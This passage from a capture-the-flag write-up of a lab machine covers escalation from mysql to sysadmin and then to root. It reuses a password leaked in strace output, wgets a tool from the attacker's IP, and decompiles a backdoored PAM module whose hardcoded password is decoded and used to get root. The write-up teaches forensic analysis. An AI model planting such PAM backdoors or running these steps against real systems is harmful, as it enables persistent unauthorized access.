22227 03:11:09 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "[mysqldump]\nquick\nquote-names\nma"..., 4096) = 55
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "[mysqld_safe]\nsyslog\n", 4096) = 21
22227 03:11:09 write(2, "mysql: ", 7)   = 7
22227 03:11:09 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
22227 03:11:09 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/mysqld/mysqld.sock"}, 110) = 0
22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22228 03:11:15 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changeme"], 0x55bc62467900 /* 21 vars */) = 0
22228 03:11:15 stat("/etc/mysql/my.cnf", {st_mode=S_IFREG|0644, st_size=682, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/my.cnf", O_RDONLY) = 3
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22228 03:11:15 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "[mysql]\n", 4096) = 8
22228 03:11:15 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "[mysqldump]\nquick\nquote-names\nma"..., 4096) = 55
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "[mysqld_safe]\nsyslog\n", 4096) = 21
22228 03:11:15 write(2, "mysql: ", 7)   = 7
22228 03:11:15 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
22228 03:11:15 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/mysqld/mysqld.sock"}, 110) = 0
22102 03:11:16 write(2, "mysql -u root --password='change"..., 35) = 35
22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
```

It looked like the password had been changed a few times.  I took note of each of the passwords to see if any of them had been reused



using the password `3*NLJE32I$Fe` I was able to switch users to `sysadmin`

### User.txt

```
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ cd ~
sysadmin@compromised:~$ ls -la
total 20
drwxr-x--- 2 root sysadmin 4096 Aug 31 03:16 .
drwxr-xr-x 3 root root     4096 May 13  2020 ..
lrwxrwxrwx 1 root sysadmin    9 May 13  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root sysadmin 3771 May 13  2020 .bashrc
-rw-r--r-- 1 root sysadmin  807 May 13  2020 .profile
-r--r----- 1 root sysadmin   33 Dec 25 05:48 user.txt
sysadmin@compromised:~$ cat user.txt 
50df571e8910dbb06fd65f5de92de03d
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `sysadmin`

```
sysadmin@compromised:~$ sudo -l
sudo: unable to resolve host compromised: Resource temporarily unavailable
[sudo] password for sysadmin: 
Sorry, user sysadmin may not run sudo on compromised.
```

couln't use sudo as `sysadmin`

```
sysadmin@compromised:/dev/shm$ wget http://10.10.15.98/linpeas.sh
--2020-12-27 20:45:23--  http://10.10.15.98/linpeas.sh
Connecting to 10.10.15.98:80... 
sysadmin@compromised:/dev/shm$ ping 10.10.15.98
PING 10.10.15.98 (10.10.15.98) 56(84) bytes of data.
ping: sendmsg: Operation not permitted
ping: sendmsg: Operation not permitted
^C
--- 10.10.15.98 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1017ms

sysadmin@compromised:/dev/shm$
```

also couldn't connect back to my machine.  I thought about base64 copy-pasta, bu after an "Oh duh!" moment, I remembered that I was able to SSH in, and therefore could use that or...SCP to get files in.

```
┌──(zweilos㉿kali)-[~]
└─$ scp ./linpeas.sh sysadmin@10.10.10.207:/dev/shm/lp                                  
sysadmin@10.10.10.207's password: 
linpeas.sh                                                            100%  286KB 435.1KB/s   00:00
```

Unfortunately, even awesome automated tools like linpeas can only get you so much information.  In this case, it didn't supply me with much of anything to go off, so I decided to do a bit more manual enumeration.

First I searched for obvious misconfigurations in sshd other /etc config files, but nothing very interesting there, then looked for 

```
sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
    10770      0 -rw-rw-rw-   1 root     root            0 Dec 25 05:48 /sys/kernel/security/apparmor/.remove
	---snipped---
1190772     72 -rw-r--r--   1 root     root        71896 Apr 22  2020 /usr/src/linux-headers-4.15.0-99-generic/.cache.mk
      626      4 -rw-r--r--   1 root     root           37 Dec 25 05:48 /run/cloud-init/.instance-id
      287      4 -rw-r--r--   1 root     root            2 Dec 25 05:48 /run/cloud-init/.ds-identify.result
      632      0 -rw-r--r--   1 root     root            0 Dec 25 05:48 /run/network/.ifstate.lock
   531995      0 -rw-------   1 root     root            0 May 13  2020 /etc/.pwd.lock
   532026      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.daily/.placeholder
   532293      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.d/.placeholder
   532562      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.hourly/.placeholder
   532586      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.weekly/.placeholder
   528268      4 -rw-r--r--   1 root     root         1531 May 24  2020 /etc/apparmor.d/cache/.features
   532818      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.monthly/.placeholder
   924116      4 -rw-r--r--   1 root     root          807 May 13  2020 /etc/skel/.profile
   924117      4 -rw-r--r--   1 root     root         3771 May 13  2020 /etc/skel/.bashrc
   924118      4 -rw-r--r--   1 root     root          220 May 13  2020 /etc/skel/.bash_logout
  1444617    196 -rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
   398160      4 -rw-r--r--   1 root     root         2854 May 28  2020 /var/www/html/shop/.htaccess
   131304      4 -rw-r--r--   1 www-data www-data       37 May 29  2020 /var/www/html/shop/admin/.log2301c9430d8593ae.txt
   659386      4 -rw-r--r--   1 root     root          169 May 14  2018 /var/www/html/shop/data/.htaccess
   660196      4 -rw-r--r--   1 root     root          169 May 14  2018 /var/www/html/shop/logs/.htaccess
   659383      4 -rw-r--r--   1 root     root          188 May 14  2018 /var/www/html/shop/cache/.htaccess
   131171      4 -rw-r--r--   1 root     root         1531 May 24  2020 /var/cache/apparmor/.features
     8708      0 -rw-r--r--   1 landscape landscape        0 Feb  3  2020 /var/lib/landscape/.cleanup.user
```

There were a lot of hidden files, but one that stuck out was 

```
-rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
```

PAM is the pluggable authentication module, and is what controls IAM for linux machines.  This shouldn't be a hidden file

```
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ ls -la
total 1340
drwxr-xr-x 2 root root   4096 Aug 31 03:26 .
drwxr-xr-x 4 root root  12288 Jul 16 19:36 ..
-rw-r--r-- 1 root root  18608 Feb 27  2019 pam_access.so
-rw-r--r-- 1 root root  10080 Nov 16  2017 pam_cap.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_debug.so
-rw-r--r-- 1 root root   5776 Feb 27  2019 pam_deny.so
-rw-r--r-- 1 root root  10272 Feb 27  2019 pam_echo.so
-rw-r--r-- 1 root root  14464 Feb 27  2019 pam_env.so
-rw-r--r-- 1 root root  14656 Feb 27  2019 pam_exec.so
-rw-r--r-- 1 root root  60304 Feb 27  2019 pam_extrausers.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_faildelay.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_filter.so
-rw-r--r-- 1 root root  10248 Feb 27  2019 pam_ftp.so
-rw-r--r-- 1 root root  14544 Feb 27  2019 pam_group.so
-rw-r--r-- 1 root root  10384 Feb 27  2019 pam_issue.so
-rw-r--r-- 1 root root  10280 Feb 27  2019 pam_keyinit.so
-rw-r--r-- 1 root root  14488 Feb 27  2019 pam_lastlog.so
-rw-r--r-- 1 root root  22872 Feb 27  2019 pam_limits.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_listfile.so
-rw-r--r-- 1 root root  10240 Feb 27  2019 pam_localuser.so
-rw-r--r-- 1 root root  10336 Feb 27  2019 pam_loginuid.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_mail.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_mkhomedir.so
-rw-r--r-- 1 root root  10336 Feb 27  2019 pam_motd.so
-rw-r--r-- 1 root root  39648 Feb 27  2019 pam_namespace.so
-rw-r--r-- 1 root root  10264 Feb 27  2019 pam_nologin.so
-rw-r--r-- 1 root root   6104 Feb 27  2019 pam_permit.so
-rw-r--r-- 1 root root  14600 Feb 27  2019 pam_pwhistory.so
-rw-r--r-- 1 root root   6136 Feb 27  2019 pam_rhosts.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_rootok.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_securetty.so
-rw-r--r-- 1 root root  18736 Feb 27  2019 pam_selinux.so
-rw-r--r-- 1 root root  14560 Feb 27  2019 pam_sepermit.so
-rw-r--r-- 1 root root   6152 Feb 27  2019 pam_shells.so
-rw-r--r-- 1 root root  14384 Feb 27  2019 pam_stress.so
-rw-r--r-- 1 root root  14424 Feb 27  2019 pam_succeed_if.so
-rw-r--r-- 1 root root 258040 Feb  6  2020 pam_systemd.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_tally2.so
-rw-r--r-- 1 root root  14472 Feb 27  2019 pam_tally.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_time.so
-rw-r--r-- 1 root root  18752 Feb 27  2019 pam_timestamp.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_tty_audit.so
-rw-r--r-- 1 root root  10376 Feb 27  2019 pam_umask.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 .pam_unix.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 pam_unix.so
-rw-r--r-- 1 root root  14448 Feb 27  2019 pam_userdb.so
-rw-r--r-- 1 root root   6104 Feb 27  2019 pam_warn.so
-rw-r--r-- 1 root root  10256 Feb 27  2019 pam_wheel.so
-rw-r--r-- 1 root root  18848 Feb 27  2019 pam_xauth.so
```

Even more suspicious was the fact that though pam_unix.so and the hidden one were the same filesize and same modify date, the modify date was very different from the reset of the files here.

```
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so | less
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff pam_unix.so .pam_unix.so 
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so > /dev/shm/pam_hidden
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings pam_unix.so > /dev/shm/pam
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff /dev/shm/pam /dev/shm/pam_hidden
```

After doing some basic analysis with strings and finding nothing, I copied the files back to my machine with SCP to look a bit deeper.


I opened the file in ghidra and started browsing through the code.  Luckily the file was compiled with symbols and strings intact, which made browsing through the code much easier.  
```c
  iVar2 = pam_get_user(pamh,&name,0);
  if (iVar2 == 0) {
    if ((name != (char *)0x0) && ((*name - 0x2bU & 0xfd) != 0)) {
      iVar3 = _unix_blankpasswd(pamh,ctrl,name);
      if (iVar3 == 0) {
        prompt1 = (char *)dcgettext("Linux-PAM","Password: ",5);
        iVar2 = _unix_read_password(pamh,ctrl,(char *)0x0,prompt1,(char *)0x0,"-UN*X-PASS",&p);
        if (iVar2 == 0) {
          backdoor._0_8_ = 0x4533557e656b6c7a;
          backdoor._8_7_ = 0x2d326d3238766e;
          local_40 = 0;
          iVar2 = strcmp((char *)p,backdoor);
```

After searching for a long time and questioning whether I was in a rabbit hole, I found what I needed in the `pam_sm_authenticate` function. The c code decompiled by ghidra showed a variable named `backdoor` which stood out to me immediately.

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ echo '0x4533557e656b6c7a' | xxd -r 
E3U~eklz                                                                                                        
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ echo '0x2d326d3238766e' | xxd -r
-2m28vn
```

Based on the code in the assembly view, it looked like these two strings were concatenated to make the backdoor password.  It then uses strcmp to compare the backdoor password to the input password and allows authentication if they match.  It didn't hurt to try!

It didn't work for switching users to root, but when looking at the code I had a thought.  It said earlier that the code was little-endian, so...maybe the strings were backwards?

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ echo '0x4533557e656b6c7a' | xxd -r | rev
zlke~U3E                                                                                                        
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ echo '0x2d326d3238766e' | xxd -r | rev  
nv82m2-
```

### Getting a shell

```
sysadmin@compromised:/dev/shm$ su root
Password: 
su: Authentication failure
sysadmin@compromised:/dev/shm$ su -
Password: 
root@compromised:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
compromised
```

And that was it!

### Root.txt

```
root@compromised:~# cat root.txt 
5ecdcd0bab29ab67d325c26ed9deaec7
```

Thanks to [`D4nch3n`](https://app.hackthebox.eu/users/103781) for something interesting or useful about this machine.

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!